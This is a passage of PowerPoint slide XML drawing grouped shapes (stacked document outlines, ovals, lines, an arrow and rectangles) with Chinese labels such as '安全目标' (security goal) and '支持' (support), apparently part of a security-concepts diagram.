              <a:chOff x="0" y="0"/>
              <a:chExt cx="468" cy="353"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="114" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="86" y="0"/>
                <a:ext cx="382" cy="282"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 576"/>
                  <a:gd name="T1" fmla="*/ 1 h 425"/>
                  <a:gd name="T2" fmla="*/ 0 w 576"/>
                  <a:gd name="T3" fmla="*/ 0 h 425"/>
                  <a:gd name="T4" fmla="*/ 1 w 576"/>
                  <a:gd name="T5" fmla="*/ 0 h 425"/>
                  <a:gd name="T6" fmla="*/ 1 w 576"/>
                  <a:gd name="T7" fmla="*/ 1 h 425"/>
                  <a:gd name="T8" fmla="*/ 1 w 576"/>
                  <a:gd name="T9" fmla="*/ 1 h 425"/>
                  <a:gd name="T10" fmla="*/ 1 w 576"/>
                  <a:gd name="T11" fmla="*/ 1 h 425"/>
                  <a:gd name="T12" fmla="*/ 1 w 576"/>
                  <a:gd name="T13" fmla="*/ 1 h 425"/>
                  <a:gd name="T14" fmla="*/ 1 w 576"/>
                  <a:gd name="T15" fmla="*/ 1 h 425"/>
                  <a:gd name="T16" fmla="*/ 1 w 576"/>
                  <a:gd name="T17" fmla="*/ 1 h 425"/>
                  <a:gd name="T18" fmla="*/ 1 w 576"/>
                  <a:gd name="T19" fmla="*/ 1 h 425"/>
                  <a:gd name="T20" fmla="*/ 1 w 576"/>
                  <a:gd name="T21" fmla="*/ 1 h 425"/>
                  <a:gd name="T22" fmla="*/ 1 w 576"/>
                  <a:gd name="T23" fmla="*/ 1 h 425"/>
                  <a:gd name="T24" fmla="*/ 1 w 576"/>
                  <a:gd name="T25" fmla="*/ 1 h 425"/>
                  <a:gd name="T26" fmla="*/ 1 w 576"/>
                  <a:gd name="T27" fmla="*/ 1 h 425"/>
                  <a:gd name="T28" fmla="*/ 1 w 576"/>
                  <a:gd name="T29" fmla="*/ 1 h 425"/>
                  <a:gd name="T30" fmla="*/ 1 w 576"/>
                  <a:gd name="T31" fmla="*/ 1 h 425"/>
                  <a:gd name="T32" fmla="*/ 1 w 576"/>
                  <a:gd name="T33" fmla="*/ 1 h 425"/>
                  <a:gd name="T34" fmla="*/ 1 w 576"/>
                  <a:gd name="T35" fmla="*/ 1 h 425"/>
                  <a:gd name="T36" fmla="*/ 1 w 576"/>
                  <a:gd name="T37" fmla="*/ 1 h 425"/>
                  <a:gd name="T38" fmla="*/ 0 w 576"/>
                  <a:gd name="T39" fmla="*/ 1 h 4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6"/>
                  <a:gd name="T61" fmla="*/ 0 h 425"/>
                  <a:gd name="T62" fmla="*/ 576 w 576"/>
                  <a:gd name="T63" fmla="*/ 425 h 4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6" h="425">
                    <a:moveTo>
                      <a:pt x="0" y="372"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="372"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="543" y="349"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="509" y="332"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="470" y="323"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="432" y="319"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="394" y="323"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="355" y="332"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="321" y="349"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="288" y="372"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="255" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="221" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="421"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="425"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="421"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="372"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="CCFFFF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="115" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="43" y="36"/>
                <a:ext cx="382" cy="282"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 576"/>
                  <a:gd name="T1" fmla="*/ 1 h 426"/>
                  <a:gd name="T2" fmla="*/ 0 w 576"/>
                  <a:gd name="T3" fmla="*/ 0 h 426"/>
                  <a:gd name="T4" fmla="*/ 1 w 576"/>
                  <a:gd name="T5" fmla="*/ 0 h 426"/>
                  <a:gd name="T6" fmla="*/ 1 w 576"/>
                  <a:gd name="T7" fmla="*/ 1 h 426"/>
                  <a:gd name="T8" fmla="*/ 1 w 576"/>
                  <a:gd name="T9" fmla="*/ 1 h 426"/>
                  <a:gd name="T10" fmla="*/ 1 w 576"/>
                  <a:gd name="T11" fmla="*/ 1 h 426"/>
                  <a:gd name="T12" fmla="*/ 1 w 576"/>
                  <a:gd name="T13" fmla="*/ 1 h 426"/>
                  <a:gd name="T14" fmla="*/ 1 w 576"/>
                  <a:gd name="T15" fmla="*/ 1 h 426"/>
                  <a:gd name="T16" fmla="*/ 1 w 576"/>
                  <a:gd name="T17" fmla="*/ 1 h 426"/>
                  <a:gd name="T18" fmla="*/ 1 w 576"/>
                  <a:gd name="T19" fmla="*/ 1 h 426"/>
                  <a:gd name="T20" fmla="*/ 1 w 576"/>
                  <a:gd name="T21" fmla="*/ 1 h 426"/>
                  <a:gd name="T22" fmla="*/ 1 w 576"/>
                  <a:gd name="T23" fmla="*/ 1 h 426"/>
                  <a:gd name="T24" fmla="*/ 1 w 576"/>
                  <a:gd name="T25" fmla="*/ 1 h 426"/>
                  <a:gd name="T26" fmla="*/ 1 w 576"/>
                  <a:gd name="T27" fmla="*/ 1 h 426"/>
                  <a:gd name="T28" fmla="*/ 1 w 576"/>
                  <a:gd name="T29" fmla="*/ 1 h 426"/>
                  <a:gd name="T30" fmla="*/ 1 w 576"/>
                  <a:gd name="T31" fmla="*/ 1 h 426"/>
                  <a:gd name="T32" fmla="*/ 1 w 576"/>
                  <a:gd name="T33" fmla="*/ 1 h 426"/>
                  <a:gd name="T34" fmla="*/ 1 w 576"/>
                  <a:gd name="T35" fmla="*/ 1 h 426"/>
                  <a:gd name="T36" fmla="*/ 1 w 576"/>
                  <a:gd name="T37" fmla="*/ 1 h 426"/>
                  <a:gd name="T38" fmla="*/ 0 w 576"/>
                  <a:gd name="T39" fmla="*/ 1 h 42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6"/>
                  <a:gd name="T61" fmla="*/ 0 h 426"/>
                  <a:gd name="T62" fmla="*/ 576 w 576"/>
                  <a:gd name="T63" fmla="*/ 426 h 42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6" h="426">
                    <a:moveTo>
                      <a:pt x="0" y="373"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="373"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="543" y="350"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="509" y="333"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="470" y="324"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="432" y="320"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="394" y="324"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="355" y="333"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="321" y="350"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="288" y="373"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="255" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="221" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="422"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="426"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="422"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="373"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="CCFFFF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="116" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="0" y="71"/>
                <a:ext cx="382" cy="282"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 576"/>
                  <a:gd name="T1" fmla="*/ 1 h 425"/>
                  <a:gd name="T2" fmla="*/ 0 w 576"/>
                  <a:gd name="T3" fmla="*/ 0 h 425"/>
                  <a:gd name="T4" fmla="*/ 1 w 576"/>
                  <a:gd name="T5" fmla="*/ 0 h 425"/>
                  <a:gd name="T6" fmla="*/ 1 w 576"/>
                  <a:gd name="T7" fmla="*/ 1 h 425"/>
                  <a:gd name="T8" fmla="*/ 1 w 576"/>
                  <a:gd name="T9" fmla="*/ 1 h 425"/>
                  <a:gd name="T10" fmla="*/ 1 w 576"/>
                  <a:gd name="T11" fmla="*/ 1 h 425"/>
                  <a:gd name="T12" fmla="*/ 1 w 576"/>
                  <a:gd name="T13" fmla="*/ 1 h 425"/>
                  <a:gd name="T14" fmla="*/ 1 w 576"/>
                  <a:gd name="T15" fmla="*/ 1 h 425"/>
                  <a:gd name="T16" fmla="*/ 1 w 576"/>
                  <a:gd name="T17" fmla="*/ 1 h 425"/>
                  <a:gd name="T18" fmla="*/ 1 w 576"/>
                  <a:gd name="T19" fmla="*/ 1 h 425"/>
                  <a:gd name="T20" fmla="*/ 1 w 576"/>
                  <a:gd name="T21" fmla="*/ 1 h 425"/>
                  <a:gd name="T22" fmla="*/ 1 w 576"/>
                  <a:gd name="T23" fmla="*/ 1 h 425"/>
                  <a:gd name="T24" fmla="*/ 1 w 576"/>
                  <a:gd name="T25" fmla="*/ 1 h 425"/>
                  <a:gd name="T26" fmla="*/ 1 w 576"/>
                  <a:gd name="T27" fmla="*/ 1 h 425"/>
                  <a:gd name="T28" fmla="*/ 1 w 576"/>
                  <a:gd name="T29" fmla="*/ 1 h 425"/>
                  <a:gd name="T30" fmla="*/ 1 w 576"/>
                  <a:gd name="T31" fmla="*/ 1 h 425"/>
                  <a:gd name="T32" fmla="*/ 1 w 576"/>
                  <a:gd name="T33" fmla="*/ 1 h 425"/>
                  <a:gd name="T34" fmla="*/ 1 w 576"/>
                  <a:gd name="T35" fmla="*/ 1 h 425"/>
                  <a:gd name="T36" fmla="*/ 1 w 576"/>
                  <a:gd name="T37" fmla="*/ 1 h 425"/>
                  <a:gd name="T38" fmla="*/ 0 w 576"/>
                  <a:gd name="T39" fmla="*/ 1 h 4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6"/>
                  <a:gd name="T61" fmla="*/ 0 h 425"/>
                  <a:gd name="T62" fmla="*/ 576 w 576"/>
                  <a:gd name="T63" fmla="*/ 425 h 4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6" h="425">
                    <a:moveTo>
                      <a:pt x="0" y="373"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="373"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="543" y="350"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="509" y="333"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="470" y="323"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="432" y="320"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="394" y="323"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="355" y="333"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="321" y="350"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="288" y="373"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="255" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="221" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="422"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="425"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="422"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="373"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="CCFFFF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="17" name="Group 53"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="4903216" y="3664360"/>
              <a:ext cx="319088" cy="147638"/>
              <a:chOff x="0" y="0"/>
              <a:chExt cx="201" cy="93"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="111" name="Oval 54"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="24" y="0"/>
                <a:ext cx="177" cy="81"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="112" name="Oval 55"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="12" y="6"/>
                <a:ext cx="177" cy="81"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="113" name="Oval 56"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="0" y="12"/>
                <a:ext cx="177" cy="81"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="18" name="Line 57"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="4436492" y="3518310"/>
              <a:ext cx="276225" cy="209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58"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipH="1" flipV="1">
              <a:off x="4722241" y="3556410"/>
              <a:ext cx="4763" cy="190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59"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipH="1" flipV="1">
              <a:off x="4760341" y="3527835"/>
              <a:ext cx="276225" cy="238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9" name="组合 158"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4193605" y="2815048"/>
            <a:ext cx="2190750" cy="642937"/>
            <a:chOff x="4193605" y="2815048"/>
            <a:chExt cx="2190750" cy="642937"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="21" name="AutoShape 60"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="16200000">
              <a:off x="4977035" y="2855529"/>
              <a:ext cx="576262" cy="628650"/>
            </a:xfrm>
            <a:prstGeom prst="leftArrow">
              <a:avLst>
                <a:gd name="adj1" fmla="val 45454"/>
                <a:gd name="adj2" fmla="val 46556"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FFCC66"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr vert="eaVert"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="Rectangle 68"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4193605" y="2815048"/>
              <a:ext cx="2190750" cy="298450"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FFCC66"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="30" name="Rectangle 95"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4820666" y="2838860"/>
              <a:ext cx="9223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0" hangingPunct="0"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>安全目标</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="158" name="组合 157"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5465191" y="2346735"/>
            <a:ext cx="1382713" cy="455613"/>
            <a:chOff x="5465191" y="2346735"/>
            <a:chExt cx="1382713" cy="455613"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="24" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5465191" y="2346735"/>
              <a:ext cx="1382713" cy="455613"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 871"/>
                <a:gd name="T1" fmla="*/ 0 h 287"/>
                <a:gd name="T2" fmla="*/ 2147483647 w 871"/>
                <a:gd name="T3" fmla="*/ 2147483647 h 287"/>
                <a:gd name="T4" fmla="*/ 2147483647 w 871"/>
                <a:gd name="T5" fmla="*/ 2147483647 h 287"/>
                <a:gd name="T6" fmla="*/ 2147483647 w 871"/>
                <a:gd name="T7" fmla="*/ 2147483647 h 287"/>
                <a:gd name="T8" fmla="*/ 2147483647 w 871"/>
                <a:gd name="T9" fmla="*/ 2147483647 h 287"/>
                <a:gd name="T10" fmla="*/ 2147483647 w 871"/>
                <a:gd name="T11" fmla="*/ 2147483647 h 287"/>
                <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                <a:gd name="T18" fmla="*/ 0 w 871"/>
                <a:gd name="T19" fmla="*/ 0 h 287"/>
                <a:gd name="T20" fmla="*/ 871 w 871"/>
                <a:gd name="T21" fmla="*/ 287 h 287"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T12">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T13">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T14">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T15">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="T16">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
                <a:cxn ang="T17">
                  <a:pos x="T10" y="T11"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T18" t="T19" r="T20" b="T21"/>
              <a:pathLst>
                <a:path w="871" h="287">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="27" y="32"/>
                    <a:pt x="113" y="152"/>
                    <a:pt x="162" y="195"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="211" y="238"/>
                    <a:pt x="238" y="244"/>
                    <a:pt x="292" y="258"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="346" y="272"/>
                    <a:pt x="407" y="287"/>
                    <a:pt x="487" y="282"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="567" y="277"/>
                    <a:pt x="711" y="271"/>
                    <a:pt x="775" y="225"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="839" y="179"/>
                    <a:pt x="855" y="91"/>
                    <a:pt x="871" y="3"/>
                  </a:cubicBezTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="38100">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 name="Rectangle 98"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="21181194">
              <a:off x="6103366" y="2564223"/>
              <a:ext cx="3556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1400" i="1">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>支持</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="157" name="组合 156"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3798317" y="2351498"/>
            <a:ext cx="1300163" cy="450850"/>
            <a:chOff x="3798317" y="2351498"/>
            <a:chExt cx="1300163" cy="450850"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="31" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3798317" y="2435635"/>
              <a:ext cx="46038" cy="46038"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 44"/>
                <a:gd name="T1" fmla="*/ 2147483647 h 44"/>
                <a:gd name="T2" fmla="*/ 2147483647 w 44"/>
                <a:gd name="T3" fmla="*/ 0 h 44"/>
                <a:gd name="T4" fmla="*/ 2147483647 w 44"/>
                <a:gd name="T5" fmla="*/ 2147483647 h 44"/>
                <a:gd name="T6" fmla="*/ 0 w 44"/>
                <a:gd name="T7" fmla="*/ 2147483647 h 44"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 60000 65536"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 w 44"/>
                <a:gd name="T13" fmla="*/ 0 h 44"/>
                <a:gd name="T14" fmla="*/ 44 w 44"/>
                <a:gd name="T15" fmla="*/ 44 h 44"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T8">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T9">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T10">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T11">
